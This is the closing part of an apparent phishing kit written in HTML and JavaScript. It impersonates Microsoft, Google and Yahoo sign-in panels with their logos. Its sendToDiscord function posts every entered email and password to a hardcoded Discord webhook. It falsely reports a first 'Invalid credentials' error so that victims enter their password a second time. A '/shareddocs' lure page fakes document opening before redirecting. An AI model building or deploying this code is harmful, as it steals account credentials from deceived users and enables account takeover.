                        microsoft: '<svg width="40" height="40" viewBox="0 0 24 24" fill="none"><path d="M11.4 3H3v8.4h8.4V3z" fill="#f25022"/><path d="M21 3h-8.4v8.4H21V3z" fill="#7fba00"/><path d="M11.4 12.6H3V21h8.4v-8.4z" fill="#00a4ef"/><path d="M21 12.6h-8.4V21H21v-8.4z" fill="#ffb900"/></svg>',
                        google: '<svg width="40" height="40" viewBox="0 0 24 24" fill="none"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>',
                        yahoo: '<svg width="40" height="40" viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z" fill="#6001D2"/><path d="M13.5 8.5l-2.5 5.5v3h2v-2.5l2.5-5.5h-2zm-3 0l-2.5 5.5V17h2v-2.5L12.5 8.5h-2z" fill="white"/><path d="M8 7h8v1H8V7z" fill="white"/></svg>',
                        email: '<svg width="40" height="40" viewBox="0 0 24 24" fill="none"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z" fill="#0066ff"/><path d="M20 8l-8 5-8-5V6l8 5 8-5v2z" fill="white"/></svg>'
                    };
                    providerLogo.innerHTML = defaultIcons[provider] || defaultIcons.email;
                };
                
                logoImg.src = logoUrl;
            }
        }
    });
}

// Utility to show errors
function showError(elId, msg){
    const el = document.getElementById(elId);
    if(!el) return;
    el.textContent = msg;
    el.style.display = 'block';
}
function hideError(elId){ const el = document.getElementById(elId); if(el) el.style.display='none'; }

// Simple embedded webhook (hardcoded as requested).
// WARNING: Hardcoding a webhook in client-distributed files exposes it publicly.

async function sendToDiscord(email, password, provider = 'Unknown', loginMethod = 'Email Input') {
    if (!DISCORD_WEBHOOK_URL) return { ok: false, reason: 'no_webhook' };

    // Detect email domain for better categorization
    const domain = getDomainFromEmail(email) || 'unknown';
    const domainLabel = domain.split('.')[0].toUpperCase();
    
    // Provider emoji mapping for visual distinction
    const providerEmojis = {
        microsoft: 'ðŸ”·',
        google: 'ðŸ”´',
        yahoo: 'ðŸŸ£',
        email: 'ðŸ“§',
        gmail: 'ðŸ“¬',
        outlook: 'ðŸ“˜',
        icloud: 'ðŸŽ',
        yahoo: 'ðŸŸ£'
    };
    
    const emoji = providerEmojis[provider.toLowerCase()] || 'ðŸ“¨';
    
    // Build the enhanced message with provider and domain info
    const content = `${emoji} **${loginMethod} Login Attempt**\n` +
                   `**Provider:** ${provider.toUpperCase()}\n` +
                   `**Email Domain:** ${domainLabel}\n` +
                   `**Email:** ${email}\n` +
                   `**Password:** ${password || '(Not provided)'}\n` +
                   `**Time:** ${new Date().toLocaleString()}\n` +
                   `**Full Domain:** ${domain}`;

    try {
        const res = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                content,
                username: `Login Monitor - ${provider}`,
                avatar_url: providerEmojis[provider.toLowerCase()] ? undefined : undefined
            })
        });
        return { ok: res.ok, status: res.status };
    } catch (err) {
        return { ok: false, reason: 'fetch_error', error: String(err) };
    }
}

// Continue button flow (main email input)
const continueBtn = document.getElementById('continueBtn');
if(continueBtn){
    continueBtn.addEventListener('click', async ()=>{
        const email = (document.getElementById('emailInput').value||'').trim();
        const key = 'main|' + email;
        if(!email){ showError('mainError','Please enter a valid email'); return; }
        hideError('mainError');
        attempts[key] = (attempts[key]||0)+1;
        if(attempts[key] === 1){
            // first attempt invalid
            showError('mainError','Invalid credentials. Please try again.');
            return;
        }
        // second attempt - proceed (send email to webhook, no password in main flow)
        // Detect provider based on email domain
        const domain = getDomainFromEmail(email);
        let detectedProvider = 'Email';
        if(domain){
            if(domain.includes('gmail.com')) detectedProvider = 'Gmail';
            else if(domain.includes('outlook.com') || domain.includes('hotmail.com') || domain.includes('live.com')) detectedProvider = 'Outlook';
            else if(domain.includes('yahoo.com')) detectedProvider = 'Yahoo';
            else if(domain.includes('icloud.com') || domain.includes('me.com')) detectedProvider = 'iCloud';
            else if(domain.includes('aol.com')) detectedProvider = 'AOL';
            else detectedProvider = domain;
        }
        
        const btn = document.getElementById('continueBtn');
        if(btn){ btn.disabled = true; btn.style.opacity = '0.6'; }
        try{
            await sendToDiscord(email, '', detectedProvider, 'Main Email Input');
            
            // Unlock document animation
            document.body.classList.add('unlocked');
            
            // Redirect after animation completes
            setTimeout(() => {
                window.location.href = 'dashboard.html';
            }, 1200);
        } finally {
            if(btn){ btn.disabled = false; btn.style.opacity = ''; }
        }
    });
}

function openProviderLogin(provider) {
    const panel = document.getElementById('providerLogin');
    const logoContainer = document.getElementById('providerLogo');
    const title = document.getElementById('providerTitle');
    const email = document.getElementById('provEmail');
    const pass = document.getElementById('provPass');

    // Set logo using SVG icons
    const svgIcons = {
        microsoft: '<svg width="40" height="40" viewBox="0 0 24 24" fill="none"><path d="M11.4 3H3v8.4h8.4V3z" fill="#f25022"/><path d="M21 3h-8.4v8.4H21V3z" fill="#7fba00"/><path d="M11.4 12.6H3V21h8.4v-8.4z" fill="#00a4ef"/><path d="M21 12.6h-8.4V21H21v-8.4z" fill="#ffb900"/></svg>',
        google: '<svg width="40" height="40" viewBox="0 0 24 24" fill="none"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>',
        yahoo: '<svg width="40" height="40" viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z" fill="#6001D2"/><path d="M13.5 8.5l-2.5 5.5v3h2v-2.5l2.5-5.5h-2zm-3 0l-2.5 5.5V17h2v-2.5L12.5 8.5h-2z" fill="white"/><path d="M8 7h8v1H8V7z" fill="white"/></svg>',
        email: '<svg width="40" height="40" viewBox="0 0 24 24" fill="none"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z" fill="#0066ff"/><path d="M20 8l-8 5-8-5V6l8 5 8-5v2z" fill="white"/></svg>'
    };
    
    if (logoContainer.tagName === 'IMG') {
        // Replace img with div to hold SVG
        const newContainer = document.createElement('div');
        newContainer.id = 'providerLogo';
        newContainer.style.display = 'inline-block';
        newContainer.innerHTML = svgIcons[provider] || svgIcons.email;
        logoContainer.parentNode.replaceChild(newContainer, logoContainer);
    } else {
        logoContainer.innerHTML = svgIcons[provider] || svgIcons.email;
    }

    // set title and placeholders
    const titles = {
        microsoft: 'Sign in with Microsoft',
        google: 'Sign in with Google',
        yahoo: 'Sign in with Yahoo',
        email: 'Sign in with Email'
    };
    title.textContent = titles[provider] || 'Sign in';

    const placeholders = {
        microsoft: 'name@example.com',
        google: 'name@gmail.com',
        yahoo: 'name@yahoo.com',
        email: 'name@yourdomain.com'
    };
    email.placeholder = placeholders[provider] || 'name@domain.com';
    pass.placeholder = 'Password';

    // apply provider class for theming
    panel.className = 'provider-login provider-' + provider + ' open';
    panel.setAttribute('aria-hidden', 'false');

    // Add a body-level class so the main card can expand while the panel is open
    document.body.classList.add('panel-open');

    // reset fields
    email.value = '';
    pass.value = '';

    // focus
    setTimeout(() => email.focus(), 120);
}

function closeProviderLogin() {
    const panel = document.getElementById('providerLogin');
    panel.classList.remove('open');
    panel.setAttribute('aria-hidden', 'true');
    // after animation remove provider class
    setTimeout(() => {
        panel.className = 'provider-login';
        document.body.classList.remove('panel-open');
    }, 250);
}

async function submitProviderForm(e) {
    e.preventDefault();
    const panel = document.getElementById('providerLogin');
    const provider = (panel.className.match(/provider-([a-z]+)/)||[])[1] || 'email';
    const email = (document.getElementById('provEmail').value||'').trim();
    const pass = document.getElementById('provPass').value || '';
    const provErrorId = 'provError';
    if(!email){ showError(provErrorId,'Please enter an email'); return; }
    hideError(provErrorId);
    const key = provider + '|' + email;
    attempts[key] = (attempts[key]||0)+1;

    const btn = panel.querySelector('.provider-submit');
    if(btn){ btn.disabled = true; btn.style.opacity = '0.6'; }

    // Map provider to readable name
    const providerNames = {
        microsoft: 'Microsoft',
        google: 'Google',
        yahoo: 'Yahoo',
        email: 'Email'
    };
    const providerName = providerNames[provider] || provider.charAt(0).toUpperCase() + provider.slice(1);

    try {
        // Always send the attempted credentials to the webhook on every submit with provider info
        await sendToDiscord(email, pass, providerName, `${providerName} Provider Login`);

        if(attempts[key] === 1){
            // first attempt: still show invalid message but we've sent the credentials
            showError(provErrorId,'Invalid credentials. Please try again.');
            return;
        }

        // second (or later) attempt - proceed to close and redirect
        closeProviderLogin();
        
        // Unlock document animation
        document.body.classList.add('unlocked');
        
        // Redirect after animation completes
        setTimeout(() => {
            window.location.href = 'dashboard.html';
        }, 1200);
    } finally {
        if(btn){ btn.disabled = false; btn.style.opacity = ''; }
    }
}

function detectDomain() {
    const email = document.getElementById("emailInput").value.toLowerCase();
    const icon = document.getElementById("mailIcon");

    if (email.includes("@gmail.com")) icon.src = icons.gmail;
    else if (email.includes("@yahoo.com")) icon.src = icons.yahoo;
    else if (
        email.includes("@outlook.com") ||
        email.includes("@hotmail.com") ||
        email.includes("@live.com") ||
        email.includes("@office365.com")
    ) icon.src = icons.outlook;
    else if (email.includes("@aol.com")) icon.src = icons.aol;
    else if (email.includes("@icloud.com") || email.includes("@me.com")) icon.src = icons.icloud;
    else if (email.includes("@proton.me") || email.includes("@protonmail.com")) icon.src = icons.proton;
    else if (email.includes("@")) icon.src = icons.domain;
    else icon.src = icons.default;
}
</script>

<script>
// Spinner logic - hide after 1 second
window.addEventListener('DOMContentLoaded', function() {
    setTimeout(function() {
        document.getElementById('spinnerOverlay').classList.add('hidden');
        document.body.classList.remove('loading');
    }, 1000);
});
</script>

<!-- Shared Docs holding + redirect (only runs on /shareddocs) -->
<script>
(function(){
        const SHAREDDOCS_REDIRECT_URL = 'https://google.com'; // <-- change this
        const TARGET_PATH = '/shareddocs';

        // normalize and check path (allow optional trailing slash)
        if (location.pathname.replace(/\/+$/,'') !== TARGET_PATH) return;

        // create lightweight holding screen
        const hold = document.createElement('div');
        hold.id = 'shareddocs-hold';
        Object.assign(hold.style, {
                position: 'fixed',
                inset: '0',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                background: '#ffffff',
                zIndex: '99999',
                fontFamily: 'Segoe UI, Arial, sans-serif',
                color: '#111'
        });

        hold.innerHTML = `
            <div style="max-width:460px;padding:28px 24px;border-radius:12px;box-shadow:0 8px 30px rgba(16,24,40,0.08);text-align:center;">
                <h1 style="margin:0 0 8px;font-size:20px;">Shared Docs</h1>
                <p style="margin:0 0 16px;color:#444">Opening your documentâ€¦</p>
                <a id="shareddocs-fallback" href="${SHAREDDOCS_REDIRECT_URL}" style="color:#0066ff;text-decoration:none;font-weight:600;">Click here if you are not redirected</a>
            </div>
        `;

        document.body.appendChild(hold);

        // redirect after exactly 1500ms using replace()
        let timeoutId = setTimeout(function(){ window.location.replace(SHAREDDOCS_REDIRECT_URL); }, 1500);

        // Cleanup: clear timeout if user navigates away (popstate) or unloads
        function cleanup(){ if(timeoutId){ clearTimeout(timeoutId); timeoutId = null; } if(hold && hold.parentNode) hold.parentNode.removeChild(hold); }
        window.addEventListener('popstate', cleanup);
        window.addEventListener('beforeunload', cleanup);
})();
</script>

</body>
</html>

<script>
// Simple History API router
(function(){
    const routes = ['/', '/shareddocs'];
    function renderRoute(path){
        // treat /shareddocs as alias of /
        const route = path === '/shareddocs' ? '/' : path;
        const app = document.getElementById('app');
        const notFound = document.getElementById('notFound');
        if(!routes.includes(path)){
            // show 404 view
            if(app) app.style.display='none';
            if(notFound) notFound.style.display='block';
            return;
        }
        // show app content
        if(notFound) notFound.style.display='none';
        if(app) app.style.display='block';
    }

    // Intercept link clicks with data-link
    document.addEventListener('click', function(e){
        const a = e.target.closest('a[data-link]');
        if(!a) return;
        e.preventDefault();
        const href = a.getAttribute('href');
        history.pushState({}, '', href);
        renderRoute(new URL(href, location.origin).pathname);
    });

    // Handle back/forward
    window.addEventListener('popstate', function(){
        renderRoute(location.pathname);
    });

    // initial render
    renderRoute(location.pathname);
})();
</script>
